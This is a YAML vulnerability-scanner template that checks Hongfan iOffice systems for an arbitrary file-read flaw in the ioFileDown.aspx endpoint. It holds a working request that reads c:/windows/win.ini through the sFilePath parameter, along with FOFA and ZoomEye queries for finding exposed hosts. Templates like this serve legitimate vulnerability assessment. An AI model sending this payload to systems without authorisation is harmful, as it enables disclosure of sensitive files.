id: hongfan-ioffice-iofiledown-fileread

info:
  name: 红帆 iOffice ioFileDown 任意文件读取漏洞
  author: fgz
  severity: high
  verified: true
  description: |-
    红帆iOffice移动办公系统，是广州红帆电脑科技有限公司基于微软.NET技术研发的，建立以笔记本、手机等便捷终端为载体实现的移动信息化系统。将智能手机、无线网络、OA系统三者有机结合，推出红帆iOffice移动办公系统，实现任何办公地点和办公时间的无缝接入，提高办公效率。红帆iOffice可接入原有的iOffice.net办公平台，用户即可以用PC管理自己的OA桌面，也可以通过移动设备（WAP手机、3G智能手机、IPAD平板电脑）访问OA系统，继续操作、浏览、管理公司的全部工作事务。ioFileDown接口处存在任意文件读取漏洞，会导致敏感数据泄露。
    fofa: app="红帆-ioffice"
    zoomeye: app:"红帆 ioffice"
  reference:
    - https://mp.weixin.qq.com/s/89oqmTU-kPx_83ZtZFdVaA
  tags: 2023,readfile,红帆
  created: 2023/11/02

rules:
  r0:
    request:
      method: GET
      path: /ioffice/prg/interface/ioFileDown.aspx?sFilePath=c:/windows/win.ini
    expression: response.status == 200 && response.body.bcontains(b"bit app support") && response.body.bcontains(b"fonts") && response.body.bcontains(b"extensions")
expression: r0()
